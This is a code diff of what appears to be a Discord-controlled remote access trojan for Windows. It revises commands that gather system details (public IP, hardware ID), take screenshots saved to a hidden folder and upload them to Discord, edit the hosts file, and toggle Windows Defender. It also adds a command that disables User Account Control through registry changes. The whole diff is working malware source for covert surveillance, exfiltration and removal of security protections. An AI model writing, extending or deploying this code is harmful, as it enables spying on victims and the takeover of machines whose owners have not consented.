@@ -79,6 +79,8 @@ async def taskbar(ctx, action):
   await ctx.send(f"Error: {e}")
 HOSTS_PATH = r"C:\Windows\System32\drivers\etc\hosts"
 REDIRECT_IP = "127.0.0.1"
+BLOCKED_SITE = "discord.com"
+
 async def sites(ctx, action=None, site=None):
     if not action or not site or action not in ["block", "unblock", "help"]:
         embed = discord.Embed(
@@ -89,6 +91,16 @@ async def sites(ctx, action=None, site=None):
         embed.add_field(name="Example", value=".sites block example.com", inline=False)
         await ctx.send(embed=embed)
         return
+    
+    if site.lower() == BLOCKED_SITE:
+        embed = discord.Embed(
+            title="Cannot Block",
+            description="You cannot block discord.com as it is the current host.", 
+            color=discord.Color.red()
+        )
+        await ctx.send(embed=embed)
+        return
+
     try:
         with open(HOSTS_PATH, "r+") as file:
             lines = file.readlines()
@@ -131,6 +143,7 @@ async def sites(ctx, action=None, site=None):
             color=discord.Color.red()
         )
     await ctx.send(embed=embed)
+
 async def admin(ctx):
     try:
         if ctypes.windll.shell32.IsUserAnAdmin():
@@ -147,228 +160,183 @@ async def admin(ctx):
             
 async def sysinfo(ctx):
     try:
-        cpu_name = None
-        cpu_architecture = None
-        cpu_cores = None
-        cpu_threads = None
-        cpu_current_freq = None
-        cpu_max_freq = None
-        cpu_temp = None
+        cpu_name=None
+        cpu_architecture=None
+        cpu_cores=None
+        cpu_threads=None
+        cpu_current_freq=None
+        cpu_max_freq=None
+        cpu_temp=None
         try:
-            cpu_info = cpuinfo.get_cpu_info()
-            cpu_name = cpu_info.get('brand_raw')
-            cpu_architecture = cpu_info.get('arch')
+            cpu_info=cpuinfo.get_cpu_info()
+            cpu_name=cpu_info.get('brand_raw')
+            cpu_architecture=cpu_info.get('arch')
         except:
             pass
         try:
-            cpu_cores = psutil.cpu_count(logical=False)
-            cpu_threads = psutil.cpu_count(logical=True)
-            cpu_freq = psutil.cpu_freq()
-            cpu_temp = psutil.sensors_temperatures().get('coretemp', [])[0].current if psutil.sensors_temperatures() else None
+            cpu_cores=psutil.cpu_count(logical=False)
+            cpu_threads=psutil.cpu_count(logical=True)
+            cpu_freq=psutil.cpu_freq()
+            cpu_temp=psutil.sensors_temperatures().get('coretemp', [])[0].current if psutil.sensors_temperatures() else None
             if cpu_freq:
-                cpu_current_freq = f"{cpu_freq.current:.2f} MHz"
-                cpu_max_freq = f"{cpu_freq.max:.2f} MHz"
+                cpu_current_freq=f"{cpu_freq.current:.2f} MHz"
+                cpu_max_freq=f"{cpu_freq.max:.2f} MHz"
         except:
             pass
-        
-        ram_total = None
-        ram_used = None
-        ram_available = None
+        ram_total=None
+        ram_used=None
+        ram_available=None
         try:
-            ram = psutil.virtual_memory()
-            ram_total = f"{ram.total / (1024 ** 3):.2f} GB"
-            ram_used = f"{ram.used / (1024 ** 3):.2f} GB ({ram.percent}%)"
-            ram_available = f"{ram.available / (1024 ** 3):.2f} GB"
+            ram=psutil.virtual_memory()
+            ram_total=f"{ram.total / (1024 ** 3):.2f} GB"
+            ram_used=f"{ram.used / (1024 ** 3):.2f} GB ({ram.percent}%)"
+            ram_available=f"{ram.available / (1024 ** 3):.2f} GB"
         except:
             pass
-        
-        disk_info = ''
+        disk_info=''
         try:
-            disks = psutil.disk_partitions()
+            disks=psutil.disk_partitions()
             for disk in disks:
                 try:
-                    usage = psutil.disk_usage(disk.mountpoint)
-                    disk_info += f"{disk.device} - {disk.mountpoint}\n  Total: {usage.total / (1024 ** 3):.2f} GB\n  Used: {usage.used / (1024 ** 3):.2f} GB ({usage.percent}%)\n  Free: {usage.free / (1024 ** 3):.2f} GB\n"
+                    usage=psutil.disk_usage(disk.mountpoint)
+                    disk_info+=f"{disk.device} - {disk.mountpoint}\nTotal: {usage.total / (1024 ** 3):.2f} GB\nUsed: {usage.used / (1024 ** 3):.2f} GB ({usage.percent}%)\nFree: {usage.free / (1024 ** 3):.2f} GB\n"
                 except PermissionError:
                     pass
         except:
             pass
-        
-        gpu_info = ''
+        gpu_info=''
         try:
-            gpus = GPUtil.getGPUs()
+            gpus=GPUtil.getGPUs()
             for gpu in gpus:
-                gpu_info += f"GPU: {gpu.name}\n  Memory Total: {gpu.memoryTotal} MB\n  Memory Used: {gpu.memoryUsed} MB\n  Memory Free: {gpu.memoryFree} MB\n  GPU Utilization: {gpu.load * 100}%\n  GPU Temperature: {gpu.temperature}°C\n"
+                gpu_info+=f"GPU: {gpu.name}\nMemory Total: {gpu.memoryTotal} MB\nMemory Used: {gpu.memoryUsed} MB\nMemory Free: {gpu.memoryFree} MB\nGPU Utilization: {gpu.load * 100}%\nGPU Temperature: {gpu.temperature}°C\n"
         except:
             pass
-        
         try:
-            public_ip = requests.get('https://api.ipify.org').text
+            public_ip=requests.get('https://api.ipify.org').text
         except:
-            public_ip = "Could not retrieve public IP"
-        
-        system_info = platform.uname()
-        
-        current_datetime = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
-        running_threads = len(psutil.pids())
-        
-        num_cpus = psutil.cpu_count()
-
-        embed = discord.Embed(title="Hardware Information", color=discord.Color.blue())
-
+            public_ip="Could not retrieve public IP"
+        system_info=platform.uname()
+        current_datetime=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        running_threads=len(psutil.pids())
+        num_cpus=psutil.cpu_count()
+        hwid=str(uuid.uuid5(uuid.NAMESPACE_DNS, platform.node()))
+        embed=discord.Embed(title="Hardware Information", color=discord.Color.blue())
         if cpu_name:
             embed.add_field(name="CPU Info", value=f"Name: {cpu_name}\nArchitecture: {cpu_architecture}\nCores: {cpu_cores}\nThreads: {cpu_threads}\nCurrent Frequency: {cpu_current_freq}\nMax Frequency: {cpu_max_freq}\nTemperature: {cpu_temp}°C", inline=False)
-
         if ram_total:
             embed.add_field(name="RAM Info", value=f"Total: {ram_total}\nUsed: {ram_used}\nAvailable: {ram_available}", inline=False)
-
         if disk_info:
             embed.add_field(name="Disk Info", value=disk_info, inline=False)
-
         if gpu_info:
             embed.add_field(name="GPU Info", value=gpu_info, inline=False)
-
         embed.add_field(name="Public IP Address", value=public_ip, inline=False)
-
-        embed.add_field(name="UUID", value=str(uuid.uuid4()), inline=False)
-
+        embed.add_field(name="HWID", value=hwid, inline=False)
         embed.add_field(name="System Info", value=f"System: {system_info.system}\nNode Name: {system_info.node}\nRelease: {system_info.release}\nVersion: {system_info.version}\nMachine: {system_info.machine}\nProcessor: {system_info.processor}", inline=False)
-
         embed.add_field(name="Date and Time", value=current_datetime, inline=False)
-
         embed.add_field(name="CPUs and Running Threads", value=f"Number of CPUs: {num_cpus}\nRunning Threads: {running_threads}", inline=False)
-
         await ctx.send(embed=embed)
-    
     except Exception as e:
         await ctx.send(f"Error retrieving hardware information: {str(e)}")
 async def takepic(ctx, timeout=8):
-    folder = os.path.join(os.getenv('APPDATA'), 'Roaming', 'media', 'screenshots')
+    folder = os.path.join(os.getenv('APPDATA'), 'screenshots')
     if not os.path.exists(folder):
         os.makedirs(folder)
-        try:
-            ctypes.windll.kernel32.SetFileAttributesW(folder, 2)
-        except Exception:
-            pass
-
-    def random_name():
-        return ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + ".png"
-
-    filename = random_name()
+        try: ctypes.windll.kernel32.SetFileAttributesW(folder, 2)
+        except: pass
+    filename = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + ".png"
     path = os.path.join(folder, filename)
-    success = False
-
     async def capture_screenshot():
-        nonlocal success
-        try:
-            pyautogui.screenshot(path).save(path)
-            success = True
-        except Exception:
-            pass
-
-        if not success:
-            try:
-                img = ImageGrab.grab()
-                img.save(path)
-                success = True
-            except Exception:
-                pass
-
+        try: pyautogui.screenshot(path).save(path)
+        except: pass
+        if not os.path.exists(path):
+            try: ImageGrab.grab().save(path)
+            except: pass
     try:
         await asyncio.wait_for(capture_screenshot(), timeout=timeout)
+        await ctx.send("heres da screenshot:", file=discord.File(path) if os.path.exists(path) else None)
     except asyncio.TimeoutError:
         await ctx.send("screenshot wasnt taken cuz it took a bit too long, try again.")
-
-    if success:
-        await ctx.send("heres da screenshot:", file=discord.File(path))
-    else:
-        await ctx.send("error taking ss")
+    except: await ctx.send("error taking ss")
 async def rotate(ctx, angle: str = None):
     if angle is None or angle.lower() == "help":
-        embed = discord.Embed(
-            title=".rotate Command Help",
-            description="This command rotates your screen to a specified angle.",
-            color=discord.Color.blue()
-        )
-        embed.add_field(
-            name="Valid Angles",
-            value="The valid angles are: 0, 90, 180, 270, 360.",
-            inline=False
-        )
-        embed.add_field(
-            name="Usage",
-            value=".rotate <angle>\nExample: `.rotate 90`",
-            inline=False
-        )
+        embed = discord.Embed(title=".rotate Command Help", description="This command rotates your screen to a specified angle.", color=discord.Color.blue())
+        embed.add_field(name="Valid Angles", value="The valid angles are: 0, 90, 180, 270.")
+        embed.add_field(name="Usage", value=".rotate <angle>\nExample: `.rotate 90`")
         await ctx.send(embed=embed)
         return
-    
+
     try:
         angle = int(angle)
     except ValueError:
-        embed = discord.Embed(
-            title="Invalid Argument!",
-            description="Please use one of the following valid angles: 0, 90, 180, 270, or 360.",
-            color=discord.Color.red()
-        )
-        embed.add_field(name="Valid Arguments", value="0, 90, 180, 270, 360", inline=False)
-        embed.add_field(name="Example Usage", value=".rotate 90", inline=False)
+        embed = discord.Embed(title="Invalid Argument!", description="Please use one of the following valid angles: 0, 90, 180, or 270.", color=discord.Color.red())
+        embed.add_field(name="Valid Arguments", value="0, 90, 180, 270")
+        embed.add_field(name="Example Usage", value=".rotate 90")
         await ctx.send(embed=embed)
         return
 
-    if angle not in [0, 90, 180, 270, 360]:
-        embed = discord.Embed(
-            title="Invalid Argument!",
-            description="Please use one of the following valid angles: 0, 90, 180, 270, or 360.",
-            color=discord.Color.red()
-        )
-        embed.add_field(name="Valid Arguments", value="0, 90, 180, 270, 360", inline=False)
-        embed.add_field(name="Example Usage", value=".rotate 90", inline=False)
+    if angle not in [0, 90, 180, 270]:
+        embed = discord.Embed(title="Invalid Argument!", description="Please use one of the following valid angles: 0, 90, 180, or 270.", color=discord.Color.red())
+        embed.add_field(name="Valid Arguments", value="0, 90, 180, 270")
+        embed.add_field(name="Example Usage", value=".rotate 90")
         await ctx.send(embed=embed)
         return
-    
+
     try:
         screen = rotatescreen.get_primary_display()
         screen.rotate_to(angle)
-        await ctx.send(f"Screen rotated by {angle} degrees.")
+        await ctx.send(f"Screen rotated to {angle} degrees.")
     except Exception as e:
         await ctx.send(f"An error occurred while rotating the screen: {e}")
 async def defend(ctx, action: str = None):
+    embed = discord.Embed(
+        title="Defender Command",
+        color=discord.Color.blue() if action is None else discord.Color.green() if action.lower() == 'on' else discord.Color.red() if action.lower() == 'off' else discord.Color.orange()
+    )
     if action is None:
-        embed = discord.Embed(
-            title="Defender Command Help",
-            description="This command toggles Windows Defender.",
-            color=discord.Color.blue()
-        )
+        embed.description = "This command toggles Windows Defender."
         embed.add_field(name="Usage", value=".defend on/off", inline=False)
-        embed.add_field(name="Description", value="Enable or disable Windows Defender.", inline=False)
-        embed.set_footer(text="Defender Bot")
-        await ctx.send(embed=embed)
     elif action.lower() == 'on':
-        yesdefend()  
-        embed = discord.Embed(
-            title="Defender Activated",
-            description="Windows Defender has been successfully enabled.",
-            color=discord.Color.green()
-        )
-        embed.set_footer(text="Defender Bot")
-        await ctx.send(embed=embed)
+        yesdefend()
+        embed.description = "Windows Defender has been successfully enabled."
     elif action.lower() == 'off':
-        nodefend()  
-        embed = discord.Embed(
-            title="Defender Deactivated",
-            description="Windows Defender has been successfully disabled.",
-            color=discord.Color.red()
-        )
-        embed.set_footer(text="Defender Bot")
-        await ctx.send(embed=embed)
+        nodefend()
+        embed.description = "Windows Defender has been successfully disabled."
     else:
-        embed = discord.Embed(
-            title="Invalid Argument",
-            description="Please provide a valid argument: `on` or `off`.",
-            color=discord.Color.orange()
-        )
+        embed.description = "Please provide a valid argument: `on` or `off`."
         embed.add_field(name="Usage", value=".defend on/off", inline=False)
-        embed.set_footer(text="Defender Bot")
+    embed.set_footer(text="Defender Bot")
+    await ctx.send(embed=embed)
+async def uac(ctx, action: str = None):
+    if action is None:
+        embed = discord.Embed(description="Please specify 'enable', 'disable', or 'get' to check UAC status.", color=discord.Color.red())
         await ctx.send(embed=embed)
+        return
+    
+    embed = discord.Embed(title="UAC Status", color=discord.Color.blue())
+    try:
+        if action.lower() == 'disable':
+            threading.Thread(target=subprocess.run, args=("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f",), kwargs={'shell': True}).start()
+            threading.Thread(target=subprocess.run, args=("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f",), kwargs={'shell': True}).start()
+            embed.add_field(name="Action", value="UAC disabled.", inline=False)
+            embed.add_field(name="Commands", value="reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f", inline=False)
+
+        elif action.lower() == 'enable':
+            threading.Thread(target=subprocess.run, args=("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f",), kwargs={'shell': True}).start()
+            threading.Thread(target=subprocess.run, args=("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 2 /f",), kwargs={'shell': True}).start()
+            embed.add_field(name="Action", value="UAC enabled.", inline=False)
+            embed.add_field(name="Commands", value="reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 2 /f", inline=False)
+
+        elif action.lower() == 'get':
+            lua_status = subprocess.run("reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA", shell=True, capture_output=True, text=True)
+            if "0x1" in lua_status.stdout:
+                embed.add_field(name="UAC Status", value="Enabled", inline=False)
+            else:
+                embed.add_field(name="UAC Status", value="Disabled", inline=False)
+        
+        else:
+            embed = discord.Embed(description="Invalid action. Please specify 'enable', 'disable', or 'get'.", color=discord.Color.red())
+        
+    except Exception as e:
+        embed = discord.Embed(description=f"Error: {str(e)}", color=discord.Color.red())
+
+    await ctx.send(embed=embed)
